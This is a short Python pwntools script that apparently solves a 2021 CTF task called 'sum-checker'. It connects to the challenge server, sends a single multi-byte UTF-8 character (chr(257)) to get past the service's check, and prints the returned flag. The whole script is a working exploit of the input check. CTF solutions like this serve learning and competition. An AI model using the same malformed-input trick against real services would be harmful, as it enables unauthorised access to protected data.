import pwn

c = pwn.connect('sum-checker.tasks.2021.ctf.cs.msu.ru', 20002)
c.recvuntil(':')
c.sendline(bytes(chr(257).encode()))
flag = c.recvuntil('}').decode()
print(flag)